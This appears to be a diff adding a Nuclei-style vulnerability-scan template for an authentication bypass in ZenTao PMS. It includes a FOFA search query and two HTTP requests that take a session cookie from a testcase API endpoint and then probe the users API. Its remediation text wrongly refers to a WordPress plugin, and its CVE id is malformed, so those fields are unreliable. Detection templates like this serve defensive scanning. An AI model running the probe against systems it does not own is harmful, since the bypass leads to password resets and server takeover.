@@ -1,0 +1,59 @@
+id: 2024-105071319 # 
+
+info:
+  name: ZenTao PMS 项目管理系统身份认证绕过漏洞 # 必填，漏洞名
+  author: k3ppf0r # 必填，作者
+  severity: high # 必填，严重程度，critical, high, medium, low, info
+  description: |
+    ZenTao PMS 是一款国产的开源项目管理软件，实现了软件的完整生命周期的全面覆盖。2024年4月，互联网上披露其存在身份认证绕过漏洞的漏洞情报，攻击者可在无需登陆的情况下利用该漏洞调用相关API功能重制密码等，并结合其他后台远程代码执行漏洞执行代码，控制服务器。
+  reference:
+    - https://www.zentao.net/download/	
+    - https://blog.csdn.net/shelter1234567/article/details/138424581?spm=1001.2014.3001.5502
+  remediation: |
+    1、如果您的 wordpress 没有安装该插件，则不受影响，无需操作。
+    2、如果使用了该插件，且在受影响版本内，建议升级该插件至最新版本。
+  classification:
+    # cvss-metrics: CVSS
+    cvss-score: 8.1
+    cve-id: 2024-105071319 
+    cwe-id: CWE-287
+    # cpe: # 可选：cpe:2.3:a:vmware:spring_cloud_function:*:*:*:*:*:*:*:*
+  metadata:
+    date: 2024-04-25 # 必填，纰漏时间，例：2019-09-22
+    version: |
+      16.x <= version < 18.12（开源版）
+      3.x <= version < 4.12（旗舰版）
+      6.x <= version < 8.12（企业版）
+    fofa-query: "zentaopms"
+  tags: cve,cve2024,zentaopms,zentao,1day
+
+
+
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=fkazcfyqgknhqdkbpttl&branch=qkkcluybdvfxqngbemmn"
+    extractors:
+      - type: regex
+        part: header
+        name: extracted_cookie
+        # need
+        internal: true
+        group: 1
+        regex:
+          - "Set-Cookie: (zentaosid=.*?);"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api.php/v1/users"
+    # headers:
+    #   Cookie: "{{extracted_cookie}}"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"error":"error: no company-browse priv."'
+
+
+
